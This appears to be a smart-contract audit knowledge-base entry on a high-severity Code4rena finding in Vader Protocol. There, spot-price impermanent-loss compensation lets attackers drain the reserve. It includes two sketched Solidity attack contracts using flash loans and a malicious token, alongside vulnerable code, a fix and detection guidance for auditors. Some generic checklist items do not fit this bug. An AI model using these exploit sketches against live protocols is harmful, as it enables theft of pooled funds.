---
# Core Classification
protocol: Vader Protocol
chain: ethereum
category: amm
vulnerability_type: impermanent_loss_manipulation

# Attack Vector Details
attack_type: economic_exploit
affected_component: reserve_drain

# Source Information
source: reports/constantproduct/h-06-lps-of-vaderpoolv2-can-manipulate-pool-reserves-to-extract-funds-from-the-r.md
audit_firm: Code4rena
severity: high

# Impact Classification
impact: reserve_drainage
exploitability: 0.8
financial_impact: high

# Context Tags
tags:
  - impermanent_loss
  - reserve_drain
  - flash_loan
  - pool_manipulation

# Version Info
language: solidity
version: all

# Pattern Identity (Required)
root_cause_family: logic_error
pattern_key: logic_error | reserve_drain | impermanent_loss_manipulation

# Interaction Scope (Required for multi-contract or multi-path issues)
interaction_scope: single_contract

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - addLiquidity
  - attack
  - block.timestamp
  - borrow
  - burn
  - calculateIL
  - claimILProtection
  - createPool
  - deposit
  - flashLoan
  - getPrice
  - mint
  - msg.sender
  - repay
  - swap
---

## References & Source Reports

| Label | Path | Severity | Auditor | Source ID / Link |
|-------|------|----------|---------|------------------|
| [Vader Protocol] | reports/constantproduct/h-06-lps-of-vaderpoolv2-can-manipulate-pool-reserves-to-extract-funds-from-the-r.md | HIGH | Code4rena | - |


# Vader Protocol - Impermanent Loss Protection Reserve Drain

## Unique Protocol Issue

**Protocol**: Vader Protocol  
**Audit Firm**: Code4rena  
**Severity**: HIGH  
**Sources**: 
- `reports/constantproduct/h-06-lps-of-vaderpoolv2-can-manipulate-pool-reserves-to-extract-funds-from-the-r.md`
- `reports/constantproduct/h-06-paying-il-protection-for-all-vaderpool-pairs-allows-the-reserve-to-be-drain.md`

## Overview

Vader Protocol implemented Impermanent Loss (IL) protection that compensated LPs from a reserve when they withdrew liquidity at a loss. The IL calculation used spot prices at withdrawal time, allowing attackers to artificially engineer massive IL through flash loans, then collect compensation from the reserve in VADER tokens.



#### Agent Quick View

- Root cause statement: "This vulnerability exists because of logic_error"
- Pattern key: `logic_error | reserve_drain | impermanent_loss_manipulation`
- Interaction scope: `single_contract`
- Primary affected component(s): `reserve_drain`
- High-signal code keywords: `addLiquidity`, `attack`, `block.timestamp`, `borrow`, `burn`, `calculateIL`, `claimILProtection`, `createPool`
- Typical sink / impact: `reserve_drainage`
- Validation strength: `moderate`

#### Contract / Boundary Map

- Entry surface(s): See pattern-specific attack scenarios below
- Contract hop(s): `MaliciousTokenAttack.function -> SecureILProtection.function -> VaderDrainer.function`
- Trust boundary crossed: `internal`
- Shared state or sync assumption: `state consistency across operations`

#### Valid Bug Signals

- Signal 1: State variable updated after external interaction instead of before (CEI violation)
- Signal 2: Withdrawal path produces different accounting than deposit path for same principal
- Signal 3: Reward accrual continues during paused/emergency state
- Signal 4: Edge case in state machine transition allows invalid state

#### False Positive Guards

- Not this bug when: Standard security patterns (access control, reentrancy guards, input validation) are in place
- Safe if: Protocol behavior matches documented specification
- Requires attacker control of: specific conditions per pattern

## Why This Is Unique to Vader

Vader's design had multiple exploitable aspects:
1. **IL Protection for ALL Pairs**: Any token pair qualified for IL protection
2. **Spot Price Calculation**: IL measured using current pool price (manipulable)
3. **Reserve Compensation**: Protocol reserve paid out VADER for IL claims
4. **No Oracle**: No external price reference to verify "true" IL

## Vulnerable Code Pattern

```solidity
// ❌ VULNERABLE: IL calculation using spot pool prices
function burn(uint256 liquidity) external returns (uint256 amountNative, uint256 amountForeign) {
    // Calculate amounts based on current reserves (manipulable!)
    (amountNative, amountForeign) = _calculateWithdrawalAmounts(liquidity);
    
    // Calculate IL based on original deposit vs current withdrawal
    // Uses current pool price - can be manipulated with flash loans
    uint256 ilLoss = VaderMath.calculateLoss(
        originalDeposit,
        amountNative,
        amountForeign,
        getPrice()  // SPOT PRICE - manipulable!
    );
    
    // Compensate LP from reserve
    if (ilLoss > 0) {
        reserve.compensate(msg.sender, ilLoss);  // Drains reserve!
    }
}

// IL paid for ALL pairs - including attacker-created tokens!
function createPool(address token) external {
    // No whitelist! Anyone can create IL-protected pools
    pools[token] = address(new VaderPool(VADER, token));
}
```

## Attack Vectors

### Attack 1: Flash Loan IL Manipulation

```solidity
contract VaderDrainer {
    function attack() external {
        // 1. Provide liquidity at current price
        vader.addLiquidity(1000 ether, 1000 ether);
        
        // 2. Flash loan huge amount of one token
        flashLoan.borrow(VADER, 100_000 ether);
        
        // 3. Trade against pool to unbalance (creates artificial IL)
        pool.swap(VADER, FOREIGN, 100_000 ether);
        // Pool now heavily imbalanced
        
        // 4. Withdraw liquidity - appears to have massive IL
        pool.burn(myLiquidity);
        // IL protection kicks in, reserve compensates for "loss"
        
        // 5. Re-add liquidity at new price
        vader.addLiquidity(receivedAmounts);
        
        // 6. Trade back to rebalance pool
        pool.swap(FOREIGN, VADER, receivedForeign);
        
        // 7. Repay flash loan
        flashLoan.repay(VADER, 100_000 ether + fee);
        
        // Result: Attacker extracted reserve funds as IL compensation
    }
}
```

### Attack 2: Malicious Token Pool

```solidity
contract MaliciousTokenAttack {
    ERC20 maliciousToken;
    
    function attack() external {
        // 1. Deploy token attacker controls
        maliciousToken = new MaliciousToken();
        
        // 2. Flash loan VADER
        flashLoan.borrow(VADER, 1_000_000 ether);
        
        // 3. Create pool with mostly VADER, tiny amount of malicious token
        vader.createPool(address(maliciousToken));
        vader.addLiquidity(1_000_000 ether, 1);  // Extreme ratio
        
        // 4. Mint malicious tokens and buy all VADER from pool
        maliciousToken.mint(address(this), type(uint256).max);
        pool.swap(address(maliciousToken), VADER, hugeAmount);
        
        // 5. Withdraw liquidity - shows massive IL (VADER dropped to 0)
        pool.burn(myLiquidity);
        // Reserve compensates for "loss" of all that VADER!
        
        // 6. Repay flash loan from extracted reserve funds
        flashLoan.repay();
        
        // Result: Drained reserve with fake IL on worthless token
    }
}
```

## Impact

- **Reserve Drainage**: Entire protocol reserve can be systematically drained
- **Protocol Insolvency**: Once reserve depleted, no IL protection for legitimate LPs
- **Unlimited Attack**: Can be repeated until reserve is empty
- **Low Attack Cost**: Only flash loan fees (0.09% on Aave)

## Secure Implementation

```solidity
// ✅ SECURE: Multiple protections against IL manipulation
contract SecureILProtection {
    // 1. Whitelist eligible pairs
    mapping(address => bool) public ilProtectedPairs;
    
    // 2. Use TWAP instead of spot price
    function calculateIL(uint256 depositTime) internal view returns (uint256) {
        // Get time-weighted average price over holding period
        uint256 twapAtDeposit = oracle.getTWAP(token, depositTime);
        uint256 twapNow = oracle.getTWAP(token, block.timestamp);
        
        // Calculate IL using manipulation-resistant prices
        return _computeIL(twapAtDeposit, twapNow);
    }
    
    // 3. Maximum IL compensation cap
    uint256 public constant MAX_IL_COMPENSATION = 0.5e18; // 50% max
    
    // 4. Time-based vesting of IL protection
    uint256 public constant MIN_HOLD_TIME = 365 days;
    
    function claimILProtection() external {
        require(
            block.timestamp >= depositTime[msg.sender] + MIN_HOLD_TIME,
            "Must hold for 1 year"
        );
        
        uint256 ilLoss = calculateIL(depositTime[msg.sender]);
        uint256 capped = ilLoss > MAX_IL_COMPENSATION ? MAX_IL_COMPENSATION : ilLoss;
        
        reserve.compensate(msg.sender, capped);
    }
}
```

## Detection Patterns

```
- IL protection for permissionless pairs (no whitelist)
- Spot price used for IL calculation (not TWAP)
- No holding period requirement for IL claims
- No maximum compensation cap
- Reserve accessible in same transaction as withdrawal
```

## Lessons for Auditors

1. **Spot Prices Are Manipulable**: Always use TWAP or external oracle for financial calculations
2. **Permissionless + Compensation = Exploit**: Whitelist anything that pays out from reserves
3. **Flash Loan Modeling**: Consider all flash loan attack vectors
4. **Time-Lock Protections**: Require holding periods before claims
5. **Cap Exposure**: Limit maximum payout per user/transaction

## Keywords

`impermanent_loss`, `IL_protection`, `reserve_drain`, `flash_loan_attack`, `spot_price_manipulation`, `vader`, `pool_manipulation`, `permissionless_pairs`, `TWAP`

### Detection Patterns

#### Code Patterns to Look For
```
- See vulnerable pattern examples above for specific code smells
- Check for missing validation on critical state-changing operations
- Look for assumptions about external component behavior
```

#### Audit Checklist
- [ ] Verify all state-changing functions have appropriate access controls
- [ ] Check for CEI pattern compliance on external calls
- [ ] Validate arithmetic operations for overflow/underflow/precision loss
- [ ] Confirm oracle data freshness and sanity checks

### Keywords for Search

> These keywords enhance vector search retrieval:

`addLiquidity`, `amm`, `attack`, `block.timestamp`, `borrow`, `burn`, `calculateIL`, `claimILProtection`, `createPool`, `deposit`, `flashLoan`, `flash_loan`, `getPrice`, `impermanent_loss`, `impermanent_loss_manipulation`, `mint`, `msg.sender`, `pool_manipulation`, `repay`, `reserve_drain`, `swap`
